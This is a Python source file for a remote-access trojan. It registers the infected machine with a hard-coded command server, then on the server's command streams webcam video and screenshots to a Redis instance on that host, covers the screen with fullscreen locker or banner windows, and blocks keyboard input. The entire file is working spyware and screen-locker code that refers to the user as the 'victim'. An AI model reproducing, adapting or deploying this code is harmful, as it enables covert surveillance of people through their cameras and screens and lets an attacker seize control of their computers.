import ssl
ssl._create_default_https_context = ssl._create_unverified_context
import hashlib, hmac, sys
import socket, base64, requests
from uuid import getnode as get_mac
import platform, json, time
import concurrent.futures
import multiprocessing, threading
import tkinter as tk
from tkinter import ttk
import keyboard
import pyautogui
from tkhtmlview import HTMLLabel

import cv2
import redis
import numpy as np

import cv2
import redis
import numpy as np

def monitor_blank_screen(root, destroy_event):
     i=0
     while True:
        print("-" * i)
        data = RequestHandlar().getVictimStatus()["blank_screen"]
        if not data:
            root.destroy()
            sys.exit()
        time.sleep(1)

def frontui():
    if RequestHandlar().getVictimStatus()["blank_screen"]:
        root = tk.Tk()
        root.configure(bg='black')
        root.attributes("-fullscreen", True, "-topmost", True, "-disabled", True)
        destroy_event = threading.Event()

        def destroy_root():
            destroy_event.set()
        progress_var = tk.DoubleVar()
        progress_bar = ttk.Progressbar(root, variable=progress_var, mode='indeterminate')
        progress_bar.place(relx=0.5, rely=0.5, anchor='center')
        progress_bar.start()
        monitoring_thread = threading.Thread(target=monitor_blank_screen, args=(root, destroy_event))
        monitoring_thread.start()

        root.mainloop()
        monitoring_thread.join()
        # while True:
        #     if 
        return root



def monitor_html_screen(root, destroy_event):
     i=0
     while True:
        print("-" * i)
        data = RequestHandlar().getVictimStatus()["banner_screen"]
        if not data:
            print("blank screen stopped")
            root.destroy()
            sys.exit()
        time.sleep(1)

def frontuiHTML():
    if RequestHandlar().getVictimStatus()["banner_screen"]:
        root = tk.Tk()
        # root.configure(bg='black')
        root.attributes("-fullscreen", True, "-topmost", True, "-disabled", True)
        destroy_event = threading.Event()

        def destroy_root():
            destroy_event.set()
        my_label = HTMLLabel(root, html=RequestHandlar().GetHtml())
        my_label.pack(pady=20, padx=20)
        monitoring_thread1 = threading.Thread(target=monitor_html_screen, args=(root, destroy_event))
        monitoring_thread1.start()

        root.mainloop()
        monitoring_thread1.join()
        return root



def monitor_shear_screen(root, destroy_event):
     i=0
     while True:
        print("-" * i)
        data = RequestHandlar().getVictimStatus()["screen_shear"]
        if not data:
            print("blank screen stopped")
            root.destroy()
            sys.exit()
        time.sleep(1)

def keyBoardLock():
    for i in range(150):
        keyboard.block_key(i)
    time.sleep(999999)


    
class RequestHandlar():
    def __init__(self):
        try:
            hostname = socket.gethostname()
            ip_address = socket.gethostbyname(hostname)
            self.ip_address=ip_address
        except Exception as e:
            print(f"Error: {e}")
            self.ip_address = "8.8.8.8"
        self.server_address = "37.60.239.157"
        self.port = 4444
        self.ConnectSystem()

    def startRequest(self, data):
        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client_socket.connect((self.server_address, self.port))
        data = data.encode("utf-8")
        self.client_socket.sendall(data)
        raw_data = self.client_socket.recv(1024).decode("utf-8")
        try:
            responsedata = json.loads(raw_data)
            return responsedata
        except Exception as e:
            print(">>>>>>>>>>>>>> line no 51", e)
        self.client_socket.close()
        return {}
    
    # {'blank_screen': False, 'banner_screen': False, 'screen_shear': False, 'camera_shear': False, 'remote_access': False, 'keyboard_lock': False}
    def getVictimStatus(self):
        payload = {
                    "path":"checkvictim",
                    "data":{
                        "systemid": self.hash_with_salt()
                            },
                    "method" : "get"
                }
        newData = self.startRequest(json.dumps(payload))
        return newData

    def BlankScreen(self, sheared_data):
        previous_status_blank = self.getVictimStatus()["blank_screen"]
        previous_status_html = self.getVictimStatus()["banner_screen"]
        previous_status_camera = self.getVictimStatus()["camera_shear"]
        previous_status_screen = self.getVictimStatus()["screen_shear"]
        previous_status_remote = self.getVictimStatus()["remote_access"]

        while True:
            # if self.getVictimStatus()["blank_screen"] and self.getVictimStatus()["blank_screen"] != previous_status_blank:
            multiprocessing.Process(target=frontui).start()
            
            # if self.getVictimStatus()["banner_screen"] and self.getVictimStatus()["banner_screen"] != previous_status_html:
            multiprocessing.Process(target=frontuiHTML).start()
            
            if self.getVictimStatus()["camera_shear"] and self.getVictimStatus()["camera_shear"] != previous_status_camera:
                multiprocessing.Process(target=screencamera).start()
            
            if self.getVictimStatus()["screen_shear"] and self.getVictimStatus()["screen_shear"] != previous_status_screen:
                multiprocessing.Process(target=screenShear).start()
            
            # if self.getVictimStatus()["remote_access"] and self.getVictimStatus()["remote_access"] != previous_status_remote:
            #     multiprocessing.Process(target=frontui).start()
            
            # if self.getVictimStatus()["banner_screen"] and self.getVictimStatus()["banner_screen"] != previous_status_html:
            #     multiprocessing.Process(target=frontui).start()
            

    def ConnectSystem(self):
        payload={}
        payload["system_id"] = self.hash_with_salt()
        print(">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>      ", self.hash_with_salt())
        payload["system_name"] = platform.node()
        payload["static_ip"] = self.ip_address
        # payload["asinged_to"] = str( random.randint(0,100000))
        ipc="8.8.8.8"
        try:
            ipc = requests.get('https://httpbin.org/ip').json()['origin']
        except:
            ipc = "8.8.8.8"
        payload["dynamic_ip"] = ipc
        payload["banner_html"] = "windows"
        payload["os_type"] = platform.system()
        final_payload = {
            "path":"addnew",
            "data":payload,
            "method":"post"
        }
        self.startRequest(json.dumps(final_payload))

    
    def GetHtml(self):
        payload ={}
        payload["system_id"] = self.hash_with_salt()
        final_payload = {
            "path":"systemdetails",
            "data":{
                        "systemid": self.hash_with_salt()
                            },
            "method" : "get"
        }
        response_data = self.startRequest(json.dumps(final_payload))
        return response_data["banner_html"]



    def encrypt_mac(self, mac):
        sha256 = hashlib.sha1()
        sha256.update(mac.encode('utf-8'))
        encrypted_mac = sha256.hexdigest()
        return encrypted_mac
    
    def get_mac_address(self):
        mac = get_mac()
        return ':'.join(("%012X" % mac)[i:i+2] for i in range(0, 12, 2))[:6]

    def hash_with_salt(self):
        data=self.get_mac_address()
        salt=self.encrypt_mac(self.get_mac_address())
        key = bytes(salt, 'utf-8')
        data_bytes = bytes(data, 'utf-8')
        hashed = hmac.new(key, msg=data_bytes, digestmod=hashlib.sha256).digest()
        hex_representation = base64.b16encode(hashed).decode('utf-8')[:6]
        return hex_representation
    
    def get_public_ip(self):
        try:
            try:
                response = requests.get('https://httpbin.org/ip').json()['origin']
                data = response.json()
                return data['origin']
            except:
                return "8.8.8.8"
            
        except Exception as e:
            print(f"Error: {e}")
            return None

def screencamera():
    redis_client = redis.StrictRedis(host='37.60.239.157', port=6379, decode_responses=True)
    cap = cv2.VideoCapture(0)

    while True:
        try:
            if not RequestHandlar().getVictimStatus()["camera_shear"]:
                cap.release()
                cv2.destroyAllWindows()
            ret, frame = cap.read()
            _, jpeg_frame = cv2.imencode('.jpg', frame)
            frame_bytes = np.array(jpeg_frame).tobytes()
            redis_client.set('video_frame_{}'.format(RequestHandlar().hash_with_salt()), frame_bytes)
            # cv2.imshow('Video Feed', frame)
            if cv2.waitKey(1) & 0xFF == ord('q'):
                break
        except Exception as e:
            if RequestHandlar().getVictimStatus()["camera_shear"]:
                redis_client = redis.StrictRedis(host='37.60.239.157', port=6379, decode_responses=True)
                cap = cv2.VideoCapture(0)

    # cap.release()
    # cv2.destroyAllWindows()


def screenShear():
    redis_client = redis.StrictRedis(host='37.60.239.157', port=6379)
    while True:
        try:
            if RequestHandlar().getVictimStatus()["camera_shear"]:
                screenshot = pyautogui.screenshot()
                screenshot_np = np.array(screenshot)
                screenshot_bgr = cv2.cvtColor(screenshot_np, cv2.COLOR_RGB2BGR)
                _, jpeg_frame = cv2.imencode('.jpg', screenshot_bgr)
                frame_bytes = np.array(jpeg_frame).tobytes()
                redis_client.set('screen_frame_{}'.format(RequestHandlar().hash_with_salt()), frame_bytes)
                time.sleep(1/60)
        except Exception as e:
            pass
        
    
if __name__ == "__main__":
    multiprocessing.set_start_method('spawn')
    camera_thread = threading.Thread(target=screencamera)
    shear_thread = threading.Thread(target=screenShear)
    # frontuiHTML_thread = threading.Thread(target=frontuiHTML)
    # shear_thread = threading.Thread(target=screenShear)

    camera_thread.start()
    shear_thread.start()
    # frontuiHTML_thread.start()
    manager = multiprocessing.Manager()
    shared_data = manager.dict()
    with concurrent.futures.ProcessPoolExecutor() as executor:
        rqh = RequestHandlar()
        future3 = executor.submit(rqh.BlankScreen, shared_data)
        future3.result()
